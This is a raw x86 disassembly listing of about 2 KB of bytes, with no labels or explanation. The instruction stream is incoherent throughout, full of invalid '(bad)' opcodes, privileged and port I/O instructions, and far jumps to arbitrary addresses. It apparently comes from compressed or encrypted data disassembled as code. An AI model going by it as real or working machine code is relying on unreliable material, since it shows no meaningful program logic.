  4017ac:	sbb    BYTE PTR [ecx+ecx*1],bl
  4017af:	add    esi,edi
  4017b1:	jecxz  0x401823
  4017b3:	lock maskmovq mm1,(bad)
  4017b5:	test   DWORD PTR [eax+0x4223250d],0x3f77a187
  4017bf:	inc    esi
  4017c0:	test   al,0x1f
  4017c2:	retf   0xba37
  4017c5:	sbb    bh,BYTE PTR [edx+0x422559b1]
  4017cb:	iret   
  4017cc:	dec    ebx
  4017cd:	xchg   ecx,eax
  4017ce:	imul   esi,ebp,0x19
  4017d1:	jo     0x4017cd
  4017d3:	cmc    
  4017d4:	pusha  
  4017d5:	out    dx,eax
  4017d6:	xor    DWORD PTR [esi+edx*4-0x15],esp
  4017da:	push   esi
  4017db:	pop    edi
  4017dc:	retf   0xbdd8
  4017df:	into   
  4017e0:	mov    ebx,ebx
  4017e2:	inc    ebx
  4017e3:	add    eax,0x9aa57e98
  4017e8:	jno    0x4017b8
  4017ea:	sub    ah,cl
  4017ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ed:	rcr    BYTE PTR [esi-0x6c],cl
  4017f0:	imul   DWORD PTR [ebx-0x68]
  4017f3:	arpl   di,dx
  4017f5:	or     al,0xff
  4017f7:	daa    
  4017f8:	jnp    0x4017e3
  4017fa:	xchg   esi,eax
  4017fb:	nop
  4017fc:	push   edx
  4017fe:	inc    esi
  4017ff:	fst    DWORD PTR [ebx+0x55]
  401802:	jmp    0x75d49491
  401807:	mov    eax,0x9f0a0e17
  40180c:	pop    edx
  40180d:	(bad)
  401810:	shr    edx,cl
  401812:	mov    ah,0x25
  401814:	ss push ebp
  401816:	xor    BYTE PTR ds:0x41d3edbe,ah
  40181c:	aaa    
  40181d:	int    0x70
  40181f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401820:	pop    edx
  401821:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401822:	lahf   
  401823:	jne    0x401850
  401825:	shl    BYTE PTR [ecx-0x20],cl
  401828:	cld    
  401829:	sbb    DWORD PTR [ebp+ebx*2+0x36],edi
  40182d:	xchg   BYTE PTR [esi+0x2a],ah
  401830:	push   0xffffff96
  401832:	mov    bl,0x39
  401834:	aas    
  401835:	fdiv   st,st(3)
  401837:	inc    edi
  401838:	repnz ror BYTE PTR [ebp-0x8],1
  40183c:	mov    ebx,0x6cbf87c
  401841:	or     DWORD PTR [eax+0x27baed81],0x3a489ccc
  40184b:	scas   eax,DWORD PTR es:[edi]
  40184c:	out    0x89,eax
  40184e:	mov    ah,BYTE PTR [ecx]
  401850:	jne    0x40189e
  401852:	(bad)  
  401853:	cmp    al,BYTE PTR [eax-0x5b]
  401856:	dec    ebx
  401857:	(bad)  
  401858:	call   0x3e6dc53a
  40185d:	dec    edx
  40185e:	fwait
  40185f:	push   0xd25ad1c1
  401864:	xchg   ebp,eax
  401865:	into   
  401866:	push   ebp
  401867:	ja     0x4018a4
  401869:	xchg   ebp,eax
  40186a:	ss out dx,al
  40186c:	mov    eax,ds:0x6cb41227
  401871:	xor    edx,ecx
  401873:	fsub   st(7),st
  401875:	cld    
  401876:	data16 or dl,cl
  401879:	mov    ebp,DWORD PTR ds:0x3ad7c501
  40187f:	sbb    BYTE PTR [ecx-0x56],dh
  401882:	std    
  401883:	(bad)  [edi+ebp*4]
  401886:	jg     0x40188d
  401888:	clc    
  401889:	stos   DWORD PTR es:[edi],eax
  40188a:	cdq    
  40188b:	xchg   edx,eax
  40188c:	sub    ebp,DWORD PTR [ecx+ebp*8]
  40188f:	(bad)  
  401890:	and    al,0xf5
  401892:	jno    0x401843
  401894:	sub    eax,0xd21271aa
  401899:	mov    esp,0x96a15681
  40189e:	icebp  
  40189f:	fnsave [edx+0x31]
  4018a2:	mov    dl,0x8f
  4018a4:	push   ebx
  4018a5:	push   es
  4018a6:	push   ebp
  4018a7:	push   esi
  4018a8:	(bad)  
  4018a9:	mov    dl,0xaa
  4018ab:	lods   al,BYTE PTR ds:[esi]
  4018ac:	(bad)  
  4018ad:	ror    DWORD PTR [ebp-0x7e],0x73
  4018b1:	push   ebp
  4018b2:	xchg   DWORD PTR [esi-0x15],esi
  4018b5:	mov    esp,0x5248a8d4
  4018ba:	pop    ebx
  4018bb:	push   ss
  4018bc:	lock or BYTE PTR [ecx-0x65],ch
  4018c0:	or     al,0x2
  4018c2:	add    BYTE PTR ds:0x529f7437,ch
  4018c8:	push   0xffffffb9
  4018ca:	push   ebx
  4018cb:	jecxz  0x4018b2
  4018cd:	stos   BYTE PTR es:[edi],al
  4018ce:	cmp    DWORD PTR [esi-0x18],edi
  4018d1:	cmp    eax,0x80e1b948
  4018d6:	mov    al,0x4d
  4018d8:	xor    edi,DWORD PTR [ebp+0x5c]
  4018db:	std    
  4018dc:	cmc    
  4018dd:	adc    eax,0xb3ce4e94
  4018e2:	mov    eax,gs:0xff121c92
  4018e8:	mov    dh,BYTE PTR [ecx]
  4018ea:	push   esi
  4018eb:	cmp    ecx,edi
  4018ed:	(bad)  
  4018ee:	fisubr WORD PTR [edx+0x552d2aa1]
  4018f4:	test   BYTE PTR [ebx+0x61],dh
  4018f7:	dec    esp
  4018f8:	das    
  4018f9:	xchg   ecx,eax
  4018fa:	mov    WORD PTR [ebp+0x57],?
  4018fd:	add    dl,cl
  4018ff:	push   edx
  401900:	mov    ebp,0xb89e66c1
  401905:	cmp    edi,DWORD PTR [edx-0x2e91bb63]
  40190b:	or     eax,0xa00cc7af
  401910:	add    eax,0x35f0925e
  401915:	pop    ds
  401916:	add    esi,DWORD PTR [ebx+0x3b]
  401919:	xchg   edx,eax
  40191a:	xor    esp,DWORD PTR [edi]
  40191c:	out    0xee,eax
  40191e:	int    0xec
  401920:	ret    
  401921:	std    
  401922:	sub    bh,BYTE PTR [edi]
  401924:	lea    eax,ds:0xcef54b6c
  40192a:	push   es
  40192b:	push   eax
  40192c:	push   ecx
  40192d:	add    eax,0x10642b93
  401932:	and    bx,WORD PTR ds:0x4a44f8e2
  401939:	jae    0x40197a
  40193b:	mov    al,0x7c
  40193d:	icebp  
  40193e:	mov    eax,0xc16ddfc6
  401943:	xchg   ebx,eax
  401944:	je     0x40198b
  401946:	loopne 0x40192f
  401948:	pop    edx
  401949:	dec    esi
  40194a:	pop    ebx
  40194b:	adc    DWORD PTR [eax],0x4758d378
  401951:	and    al,0x23
  401953:	repz test eax,0x39016117
  401959:	test   BYTE PTR [bp+di],cl
  40195c:	(bad)  
  40195d:	sahf   
  40195e:	sahf   
  40195f:	add    DWORD PTR [ebx],edi
  401961:	add    DWORD PTR [eax+edx*1],eax
  401964:	sub    DWORD PTR [ebx-0x19e2e6c8],ebx
  40196a:	int    0xa6
  40196c:	ret    
  40196d:	pop    es
  40196e:	pop    esp
  40196f:	dec    edi
  401970:	sar    BYTE PTR [ebp+0x2b996501],cl
  401976:	inc    edx
  401977:	and    BYTE PTR [ebx+ebp*2+0x2f79205a],bh
  40197e:	inc    ecx
  40197f:	arpl   WORD PTR [eax+0x44522f0e],si
  401985:	xor    ebp,DWORD PTR [edx+0x553da746]
  40198b:	mov    fs,WORD PTR [edi-0x43]
  40198e:	fstp   TBYTE PTR [ecx]
  401990:	mov    ch,bh
  401992:	int    0x66
  401994:	inc    esp
  401995:	pop    ebp
  401996:	fisubr WORD PTR [eiz*2-0x6de0a44e]
  40199d:	mov    esi,0xa97b72b6
  4019a2:	mov    cs,WORD PTR [ecx-0x7d209a61]
  4019a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019a9:	push   ds
  4019aa:	repz push es
  4019ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4019ad:	shr    DWORD PTR [ebp-0x6d],0x51
  4019b1:	sub    eax,0x23ef38aa
  4019b6:	hlt    
  4019b7:	in     eax,dx
  4019b8:	cmp    cl,BYTE PTR [eax-0x27e64eeb]
  4019be:	cli    
  4019bf:	adc    BYTE PTR [ebp+0x74],cl
  4019c2:	inc    esi
  4019c3:	and    al,0x33
  4019c5:	xor    ebp,DWORD PTR [esi]
  4019c7:	mov    ch,0x78
  4019c9:	(bad)  [eax]
  4019cb:	jg     0x4019ef
  4019cd:	sti    
  4019ce:	inc    edi
  4019cf:	push   ebx
  4019d0:	pop    ebp
  4019d1:	mov    DWORD PTR [edx],eax
  4019d3:	lahf   
  4019d4:	data16 shl BYTE PTR [esi+esi*1+0x55],1
  4019d9:	popa   
  4019da:	push   edx
  4019db:	and    BYTE PTR [esi-0x2046d0d6],cl
  4019e1:	inc    eax
  4019e2:	call   0xf75c:0x333b4585
  4019e9:	mov    ah,al
  4019eb:	push   edx
  4019ec:	ss xor al,0x73
  4019ef:	fcmovne st,st(5)
  4019f1:	jge    0x401a6a
  4019f3:	fld    QWORD PTR [esi-0x74dd6791]
  4019f9:	jge    0x4019c6
  4019fb:	mov    esi,DWORD PTR [ebx-0x3b1a6da5]
  401a01:	sti    
  401a02:	div    al
  401a04:	jecxz  0x401a16
  401a06:	push   es
  401a07:	inc    esi
  401a08:	sti    
  401a09:	jge    0x40198d
  401a0b:	pushf  
  401a0c:	xor    ax,0x3aac
  401a10:	fst    QWORD PTR [ebp+0x4d]
  401a13:	mov    eax,0x6ca69986
  401a18:	call   0xab0278a3
  401a1d:	arpl   WORD PTR [ecx+0x73],ax
  401a20:	dec    edx
  401a21:	or     BYTE PTR [ebx],ch
  401a23:	fistp  DWORD PTR [esi]
  401a25:	jmp    0x7d483b91
  401a2a:	push   esi
  401a2b:	in     eax,dx
  401a2c:	push   0xb0859cd3
  401a31:	fmul   QWORD PTR [ebx]
  401a33:	pop    ecx
  401a34:	and    ebx,0x615432f6
  401a3a:	sub    edx,DWORD PTR [ecx]
  401a3c:	add    ch,ah
  401a3e:	or     edi,DWORD PTR [edx]
  401a40:	adc    BYTE PTR [ecx],ch
  401a42:	icebp  
  401a43:	les    ecx,FWORD PTR gs:[edi]
  401a46:	sbb    al,0x32
  401a48:	add    eax,0x896fa5ed
  401a4d:	push   ebp
  401a4e:	clc    
  401a4f:	or     edi,ebp
  401a51:	int3   
  401a52:	xor    ebp,DWORD PTR [esi+0x3a]
  401a55:	aam    0x96
  401a57:	sahf   
  401a58:	mov    ax,WORD PTR ds:0xc1638b59
  401a5f:	scas   al,BYTE PTR es:[edi]
  401a60:	js     0x401a45
  401a62:	call   0x275338f4
  401a67:	jp     0x401a91
  401a69:	xchg   esp,eax
  401a6a:	(bad)  
  401a6b:	std    
  401a6c:	mov    ax,0xfa81
  401a70:	mov    edi,0x1679d9ec
  401a75:	mov    ah,BYTE PTR [ebx+0x6417ce44]
  401a7b:	(bad)  
  401a7c:	fwait
  401a7d:	mov    eax,0xf68b2351
  401a82:	scas   eax,DWORD PTR es:[edi]
  401a83:	out    dx,eax
  401a84:	pop    ebx
  401a85:	mov    ebx,0x5e68258e
  401a8a:	cmp    DWORD PTR [edi-0x3a],ebp
  401a8d:	ins    BYTE PTR es:[edi],dx
  401a8e:	xchg   ebx,eax
  401a8f:	in     eax,0xdc
  401a91:	test   esp,ecx
  401a93:	mov    al,ds:0x72b6ba23
  401a98:	mov    dh,0x66
  401a9a:	mov    DWORD PTR [ecx+0x6c4563e],0xcf5ef7b9
  401aa4:	inc    edx
  401aa5:	push   0xd4df605c
  401aaa:	mov    ah,0x92
  401aac:	das    
  401aad:	bound  esi,QWORD PTR [ebx-0x66]
  401ab0:	push   ecx
  401ab1:	xchg   ecx,eax
  401ab2:	aad    0x77
  401ab4:	mov    esp,0x6d10d331
  401ab9:	jo     0x401b30
  401abb:	scas   eax,DWORD PTR es:[edi]
  401abc:	leave  
  401abd:	hlt    
  401abe:	fdivr  QWORD PTR [edi-0x516cc32e]
  401ac4:	adc    DWORD PTR [edx+ebp*2-0x3e],0xffffff82
  401ac9:	cmp    DWORD PTR [esi+0x3ea6acaf],ebx
  401acf:	call   0x823c:0x11dbf58
  401ad6:	and    eax,0xf22f6d0a
  401adb:	push   cs
  401adc:	xchg   esi,eax
  401add:	stc    
  401ade:	scas   eax,DWORD PTR es:[edi]
  401adf:	data16 js 0x401ad5
  401ae2:	das    
  401ae3:	je     0x401a86
  401ae5:	xor    al,0x4e
  401ae7:	repz jo 0x401b36
  401aea:	mov    DWORD PTR [edx+0x6edceb48],eax
  401af0:	adc    ebp,DWORD PTR [ebx+0x2f25dfcd]
  401af6:	aam    0xeb
  401af8:	mov    ebx,0x9f2965a3
  401afd:	or     eax,0x208e803c
  401b02:	xor    BYTE PTR [ebx+0x56],ah
  401b05:	sub    ch,BYTE PTR [ebx-0x10]
  401b08:	mov    DWORD PTR [edx],0xd2fa5474
  401b0e:	pop    edi
  401b0f:	inc    ecx
  401b10:	in     al,0xc
  401b12:	xor    BYTE PTR [ebp+0xa91afda],cl
  401b18:	popa   
  401b19:	mov    ebx,0xf13aa7b8
  401b1e:	xchg   edx,eax
  401b1f:	(bad)  
  401b20:	lods   eax,DWORD PTR ds:[esi]
  401b21:	sar    BYTE PTR ds:0xf86ea729,1
  401b27:	mov    edx,eax
  401b29:	cmp    edx,esi
  401b2b:	or     al,0x2e
  401b2d:	xchg   edi,eax
  401b2e:	xor    DWORD PTR [ecx+eax*4],0x25a2decb
  401b35:	sahf   
  401b36:	imul   edx,DWORD PTR [ecx+0x62d2dd73],0xbfedf50
  401b40:	adc    ch,BYTE PTR [edx]
  401b42:	cmp    al,0xbd
  401b44:	arpl   WORD PTR [edx+0x32],cx
  401b47:	sbb    BYTE PTR [ebx+0x19],0xf6
  401b4b:	(bad)  
  401b4c:	out    dx,eax
  401b4d:	mov    ecx,0x9d5c1196
  401b52:	popa   
  401b53:	outs   dx,BYTE PTR ds:[esi]
  401b54:	daa    
  401b55:	push   ecx
  401b56:	sbb    ecx,DWORD PTR [esi-0x7c82a95]
  401b5c:	bound  ecx,QWORD PTR [edi+0x5bcd8731]
  401b62:	leave  
  401b63:	push   ebx
  401b64:	fwait
  401b65:	es in  eax,dx
  401b67:	sub    ch,dh
  401b69:	mov    dh,dh
  401b6b:	xchg   esi,eax
  401b6c:	loopne 0x401b7f
  401b6e:	out    dx,al
  401b6f:	mov    ebx,0xd6cad1c0
  401b74:	dec    eax
  401b75:	iret   
  401b76:	push   ebx
  401b77:	mov    ecx,DWORD PTR [edi+0x20]
  401b7a:	xor    al,0xf4
  401b7c:	gs loop 0x401b82
  401b7f:	or     dl,BYTE PTR [esp+ebx*2+0x1cbc99a2]
  401b86:	and    ah,bh
  401b88:	dec    ebx
  401b89:	cwde   
  401b8a:	sub    eax,0x76004551
  401b8f:	xor    eax,0x3db32898
  401b94:	imul   eax,DWORD PTR [esi+0x46],0xffffffb4
  401b98:	fisttp DWORD PTR [ebx+0x27]
  401b9b:	shr    BYTE PTR [esi+0xe],0x8b
  401b9f:	mov    bh,0x67
  401ba1:	fdivr  st,st(7)
  401ba3:	dec    dh
  401ba5:	dec    esp
  401ba6:	mov    ecx,0xc01a539e
  401bab:	int3   
  401bac:	jmp    DWORD PTR [edi+ecx*8+0x66a0806c]
  401bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bb5:	out    dx,eax
  401bb6:	adc    ah,cl
  401bb8:	and    bh,BYTE PTR [esi]
  401bba:	enter  0x2373,0xfe
  401bbe:	push   ebp
  401bbf:	cmp    al,0xc2
  401bc1:	mov    bl,0x44
  401bc3:	dec    edx
  401bc4:	cli    
  401bc5:	in     al,0x6a
  401bc7:	jo     0x401bc7
  401bc9:	outs   dx,BYTE PTR ds:[esi]
  401bca:	pop    esi
  401bcb:	call   0xf5e90fb0
  401bd0:	or     dl,BYTE PTR [esi+0x39]
  401bd3:	stc    
  401bd4:	xlat   BYTE PTR ds:[ebx]
  401bd5:	xor    eax,0x17f20e08
  401bda:	leave  
  401bdb:	js     0x401bcb
  401bdd:	jl     0x401be6
  401bdf:	jb     0x401c0b
  401be1:	xchg   edi,eax
  401be2:	pusha  
  401be3:	shl    DWORD PTR [edx+0x4a370517],cl
  401be9:	(bad)  
  401bea:	xor    BYTE PTR [eax],cl
  401bec:	loop   0x401c64
  401bee:	inc    eax
  401bef:	add    eax,0xf37115f9
  401bf4:	cs xchg esp,eax
  401bf6:	leave  
  401bf7:	(bad)  
  401bf8:	stc    
  401bf9:	lods   eax,DWORD PTR ds:[esi]
  401bfa:	sahf   
  401bfb:	aaa    
  401bfc:	pop    ebx
  401bfd:	test   al,0xfd
  401bff:	retf   0xc828
  401c02:	jb     0x401baa
  401c04:	mov    al,0x98
  401c06:	shr    DWORD PTR [ebx+0x2328d91d],0xb8
  401c0d:	push   eax
  401c0e:	push   edi
  401c0f:	push   edi
  401c10:	aaa    
  401c11:	dec    edx
  401c12:	sbb    DWORD PTR [esi+0x45b6697b],ebp
  401c18:	pop    edi
  401c19:	mov    ebp,0x1bc0503
  401c1e:	imul   ecx,DWORD PTR [ebp-0x45],0xffffffd7
  401c22:	call   0xae58:0x58795b83
  401c29:	sub    eax,0xf61ef5b3
  401c2e:	xchg   ebp,eax
  401c2f:	ja     0x401c94
  401c31:	xchg   ecx,eax
  401c32:	push   esp
  401c33:	sbb    ch,BYTE PTR [esi+edx*8+0x6642e7fb]
  401c3a:	div    DWORD PTR [ebp+0x62d9a2bc]
  401c40:	retf   0xda1f
  401c43:	mov    ds,WORD PTR [ebp-0x59]
  401c46:	xlat   BYTE PTR ds:[ebx]
  401c47:	fcomip st,st(7)
  401c49:	pop    edx
  401c4a:	mov    ebx,0xc15e03cf
  401c4f:	into   
  401c50:	inc    ebp
  401c51:	call   0x5bf4:0x958e680b
  401c58:	pop    es
  401c59:	mov    bl,0x32
  401c5b:	ja     0x401c8c
  401c5d:	push   esp
  401c5e:	mov    DWORD PTR [ebp-0x6a],0x3e6117e
  401c65:	icebp  
  401c66:	in     eax,dx
  401c67:	scas   eax,DWORD PTR es:[edi]
  401c68:	dec    ecx
  401c69:	dec    ebx
  401c6a:	xchg   DWORD PTR es:[esi-0x42],esp
  401c6e:	ret    0xf633
  401c71:	dec    DWORD PTR [eax-0x69]
  401c74:	jp     0x401ce5
  401c76:	ins    DWORD PTR es:[edi],dx
  401c77:	push   cs
  401c78:	push   eax
  401c79:	lods   al,BYTE PTR ds:[esi]
  401c7a:	mov    cl,0x46
  401c7c:	pop    esi
  401c7d:	test   BYTE PTR ds:[ebx],bh
  401c80:	int    0x65
  401c82:	aaa    
  401c83:	adc    edi,DWORD PTR [esi+0x31]
  401c86:	inc    edx
  401c87:	adc    ebp,0x2affc72c
  401c8d:	mov    ebx,0x2e4257a
  401c92:	push   edi
  401c93:	int3   
  401c94:	pop    ds
  401c95:	jnp    0x401ca4
  401c97:	in     al,dx
  401c98:	arpl   WORD PTR [edx-0x66a40021],cx
  401c9e:	xor    al,BYTE PTR [edi+0x3b]
  401ca1:	cmp    DWORD PTR [eax-0x7c],0xffffffcb
  401ca5:	or     BYTE PTR [ebp-0x75],0x36
  401ca9:	mov    BYTE PTR [eax],bh
  401cab:	inc    eax
  401cac:	or     ah,BYTE PTR [esp+edx*4+0x62cec0d]
  401cb3:	jnp    0x401cbf
  401cb5:	pusha  
  401cb6:	pop    es
  401cb7:	dec    ebx
  401cb8:	sbb    DWORD PTR [esi],0x2f25d604
  401cbe:	pop    edi
  401cbf:	test   dh,ch
  401cc1:	inc    eax
  401cc2:	rcl    DWORD PTR [edx-0x7],1
  401cc5:	and    DWORD PTR [edi-0x30],0x7a06b62c
  401ccc:	inc    ebp
  401ccd:	icebp  
  401cce:	lea    ebp,[esi+0x5fa99d35]
  401cd4:	mov    dh,0x12
  401cd6:	dec    eax
  401cd7:	sub    al,0xd0
  401cd9:	inc    edi
  401cda:	fnsetpm(287 only) 
  401cdc:	xor    DWORD PTR [esi+0x7d7466e9],eax
  401ce2:	and    dh,BYTE PTR [edi]
  401ce4:	shr    DWORD PTR [eax-0x36],cl
  401ce7:	push   ebp
  401ce8:	(bad)  
  401cea:	push   edi
  401ceb:	retf   
  401cec:	mov    ecx,0x5a5b57e0
  401cf1:	xchg   ecx,eax
  401cf2:	jno    0x401cc6
  401cf4:	cdq    
  401cf5:	pop    ds
  401cf6:	loopne 0x401cf6
  401cf8:	xor    ecx,edx
  401cfa:	push   esi
  401cfb:	mov    cl,0xb5
  401cfd:	cmp    eax,0x7f1ce179
  401d02:	lds    esp,FWORD PTR [edx+eiz*2]
  401d05:	jb     0x401ca8
  401d07:	cmp    al,BYTE PTR [ebx]
  401d09:	add    DWORD PTR ds:0x72ff24b0,0xfffffff5
  401d10:	jecxz  0x401cef
  401d12:	inc    ebx
  401d13:	mov    ecx,DWORD PTR [eax+edx*4+0x44840bbf]
  401d1a:	fidiv  DWORD PTR [edx+0x32]
  401d1d:	jns    0x401cab
  401d1f:	and    DWORD PTR [esi-0x4d],0x5ac745a9
  401d26:	fst    st(3)
  401d28:	or     eax,0xbc419c32
  401d2d:	push   ds
  401d2e:	fsub   DWORD PTR gs:[esi-0x69008995]
  401d35:	pop    esi
  401d36:	jg     0x401d1a
  401d38:	(bad)  
  401d39:	mov    cl,0xba
  401d3b:	push   ebx
  401d3c:	cmp    esi,edi
  401d3e:	mov    al,ds:0xcd5d12d6
  401d43:	xor    esp,DWORD PTR [ebp-0x4c28bdcf]
  401d49:	jae    0x401d01
  401d4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d4c:	mov    edx,DWORD PTR [edx]
  401d4e:	sahf   
  401d4f:	mov    eax,0x5f62b231
  401d54:	out    0x53,eax
  401d56:	mov    ch,0xc3
  401d58:	shl    DWORD PTR [edi-0x4f],cl
  401d5b:	jecxz  0x401d11
  401d5d:	bound  eax,QWORD PTR [esi]
  401d5f:	mov    esp,DWORD PTR [ebp+0x62]
  401d62:	xchg   dl,ah
  401d64:	and    ecx,DWORD PTR [ebx+0x56a58e09]
  401d6a:	or     DWORD PTR [ebx+0x5],esp
  401d6d:	daa    
  401d6e:	inc    ecx
  401d6f:	into   
  401d70:	fsubr  DWORD PTR [eax-0x7244889]
  401d76:	hlt    
  401d77:	pop    edx
  401d78:	in     al,dx
  401d79:	sub    BYTE PTR [ebp-0x19325ab2],dh
  401d7f:	into   
  401d80:	jge    0x401d9c
  401d82:	xchg   ebx,eax
  401d83:	scas   eax,DWORD PTR es:[edi]
  401d84:	xchg   esp,eax
  401d85:	push   esi
  401d86:	sbb    eax,0x3674181a
  401d8b:	test   al,ch
  401d8d:	mov    ah,0x83
  401d8f:	scas   al,BYTE PTR es:[edi]
  401d90:	pop    eax
  401d91:	push   ss
  401d92:	and    BYTE PTR [ebx+0xa],dh
  401d95:	jmp    0x401d90
  401d97:	je     0x401ddd
  401d99:	push   ecx
  401d9a:	cli    
  401d9b:	or     eax,0xe3b654f
  401da0:	mov    esp,0xf0f9fd8f
  401da5:	cmc    
  401da6:	fldcw  WORD PTR ds:0x4e4c19cc
  401dac:	arpl   WORD PTR [ebx+0x269cbedb],di
  401db2:	cwde   
  401db3:	test   DWORD PTR [ecx],ecx
  401db5:	pop    esi
  401db6:	repnz or ebx,DWORD PTR [ecx]
  401db9:	jnp    0x401dba
  401dbb:	adc    DWORD PTR [edx+ecx*2+0x8],edi
  401dbf:	daa    
  401dc0:	cmp    BYTE PTR [ebx-0x1b],dl
  401dc3:	rol    DWORD PTR [esi+0x5],0xde
  401dc7:	and    al,0x66
  401dc9:	sub    al,0xdc
  401dcb:	sbb    cl,BYTE PTR [ebx+0x31]
  401dce:	gs push ebp
  401dd0:	inc    ebp
  401dd1:	add    dh,cl
  401dd3:	cli    
  401dd4:	jnp    0x401d57
  401dd6:	push   ebx
  401dd7:	je     0x401dee
  401dd9:	dec    eax
  401dda:	mov    dh,BYTE PTR [esi+0x76b61d49]
  401de0:	inc    edi
  401de1:	std    
  401de2:	rol    DWORD PTR [ebx+ebx*1+0xfc9e982],0xa1
  401dea:	push   0x516a6a2
  401def:	push   0xffffffee
  401df1:	inc    edi
  401df2:	jmp    0x827c:0x62b96de8
  401df9:	push   esp
  401dfa:	(bad)  
  401dfb:	mov    WORD PTR [edi+0x32],cs
  401dfe:	shr    BYTE PTR [esi],0x81
  401e01:	mov    ebp,0xc6e5bb04
  401e06:	pop    edi
  401e07:	or     eax,0x48ef0896
  401e0c:	xor    esi,esp
  401e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e0f:	xor    esi,DWORD PTR [edx+0x1120fdd8]
  401e15:	cs clc 
  401e17:	pop    ds
  401e18:	lods   al,BYTE PTR ds:[esi]
  401e19:	cmp    al,0x3e
  401e1b:	xchg   esi,eax
  401e1c:	inc    esp
  401e1d:	pop    es
  401e1e:	nop
  401e1f:	inc    ecx
  401e20:	cmp    ah,BYTE PTR [edx]
  401e22:	or     cl,bh
  401e24:	sub    edi,DWORD PTR [edx+0x5301b0a4]
  401e2a:	jmp    0x401e09
  401e2c:	adc    al,ch
  401e2e:	inc    eax
  401e2f:	fcom   DWORD PTR [ecx-0x7b3dbc0e]
  401e35:	aam    0x39
  401e37:	and    eax,0xf38438e3
  401e3c:	mov    ebp,edi
  401e3e:	inc    edi
  401e3f:	stos   BYTE PTR es:[edi],al
  401e40:	xchg   DWORD PTR [edx],ebx
  401e42:	sbb    BYTE PTR [ecx],0x52
  401e45:	call   FWORD PTR [ebp-0x2f]
  401e48:	or     DWORD PTR [edi],0xffffffbf
  401e4b:	sub    eax,0x697a4d9
  401e50:	dec    esi
  401e51:	adc    al,0x9b
  401e53:	daa    
  401e54:	inc    ebp
  401e55:	jmp    FWORD PTR [ecx]
  401e57:	jns    0x401eb9
  401e59:	mov    ebx,0xc3666bf8
  401e5e:	mov    WORD PTR [edi+0x73],?
  401e61:	adc    DWORD PTR [ebx],edi
  401e63:	cwde   
  401e64:	mov    ebx,0xfa52c1cd
  401e69:	pop    ds
  401e6a:	out    dx,al
  401e6b:	push   es
  401e6c:	xchg   esp,eax
  401e6d:	and    edx,DWORD PTR [eax]
  401e6f:	mov    cl,al
  401e71:	(bad)  
  401e72:	adc    eax,0xf11f295e
  401e77:	loopne 0x401e69
  401e79:	jne    0x401e0a
  401e7b:	xchg   edx,eax
  401e7c:	or     DWORD PTR [edi+0x0],esi
  401e7f:	push   cs
  401e80:	mov    al,BYTE PTR [esi+0x18f300fd]
  401e86:	cmp    eax,0x3914dbf2
  401e8b:	push   esp
  401e8c:	push   edi
  401e8d:	and    ah,BYTE PTR [ebx]
  401e8f:	fisub  DWORD PTR [ecx+0x199faed2]
  401e95:	inc    eax
  401e96:	aaa    
  401e97:	enter  0xf772,0x1b
  401e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e9c:	test   BYTE PTR [ebx-0x6d851d18],ch
  401ea2:	sahf   
  401ea3:	pusha  
  401ea4:	dec    esi
  401ea5:	add    eax,0x348bbb5b
  401eaa:	adc    BYTE PTR [ecx-0x5334b348],cl
  401eb0:	pop    DWORD PTR [ebx+0x3047c035]
  401eb6:	xchg   esp,eax
  401eb7:	std    
  401eb8:	dec    esp
  401eb9:	outs   dx,DWORD PTR ds:[esi]
  401eba:	shr    edx,0x57
  401ebd:	fs (bad) 
  401ebf:	int3   
  401ec0:	and    DWORD PTR [edi+0x4],esp
  401ec3:	loopne 0x401e64
  401ec5:	xchg   ecx,eax
  401ec6:	or     ebp,esp
  401ec8:	dec    edx
  401ec9:	jmp    0xc223e418
  401ece:	loop   0x401eb2
  401ed0:	dec    edx
  401ed1:	jne    0x401e61
  401ed3:	sbb    al,0x13
  401ed5:	mov    ebp,0x646d91fe
  401eda:	jne    0x401f30
  401edc:	rol    eax,0xa0
  401edf:	es in  al,0x10
  401ee2:	in     al,0x75
  401ee4:	jle    0x401ef7
  401ee6:	jmp    0x6721d884
  401eeb:	dec    esp
  401eec:	sub    eax,0x3432e19
  401ef1:	int    0x63
  401ef3:	lods   eax,DWORD PTR ds:[esi]
  401ef4:	add    al,0x10
  401ef6:	xchg   ebp,eax
  401ef7:	xchg   edx,eax
  401ef8:	and    eax,0x2d765b93
  401efd:	loop   0x401f19
  401eff:	xchg   edx,eax
  401f00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f01:	or     al,0x88
  401f03:	mov    esi,0x7250593a
  401f08:	dec    edi
  401f09:	and    al,0x40
  401f0b:	mov    edi,0x4639df90
  401f10:	xor    esp,DWORD PTR [esi]
  401f12:	mov    WORD PTR [edx-0x73],?
  401f15:	fld    QWORD PTR [ebp+0x6b]
  401f18:	add    ecx,esi
  401f1a:	jmp    0x293d2afc
  401f1f:	test   al,0x46
  401f21:	cmp    al,BYTE PTR [ebp+0x525d58e6]
  401f27:	push   esp
  401f28:	push   es
  401f29:	pop    edx
  401f2a:	scas   eax,DWORD PTR es:[edi]
  401f2b:	push   eax
  401f2c:	mov    edi,0xcce229ae
  401f31:	bnd jo 0x401f4f
  401f34:	dec    esp
  401f35:	sbb    eax,0x175f51f8
  401f3a:	sbb    eax,0x2a0a8cb4
  401f3f:	fisubr DWORD PTR [eax+0x50ea360]
  401f45:	outs   dx,DWORD PTR gs:[esi]
  401f47:	mov    ebx,0x284d297e
  401f4c:	out    dx,al
  401f4d:	pop    edx
  401f4e:	in     eax,dx
  401f4f:	pop    edx
  401f50:	add    dh,BYTE PTR [ebx-0x14]
  401f53:	sub    ch,bh
  401f55:	mov    esp,0x6304
  401f5a:	add    edx,ebp
  401f5c:	sub    DWORD PTR [edx-0x14a41a8d],edi
  401f62:	pop    ebx
  401f63:	push   es
  401f64:	je     0x401f36
  401f66:	sub    DWORD PTR [edi+edi*4],eax
  401f69:	add    BYTE PTR [eax],al
  401f6b:	add    al,BYTE PTR [edx*2-0x19fa0000]
  401f72:	sub    al,BYTE PTR [edx]
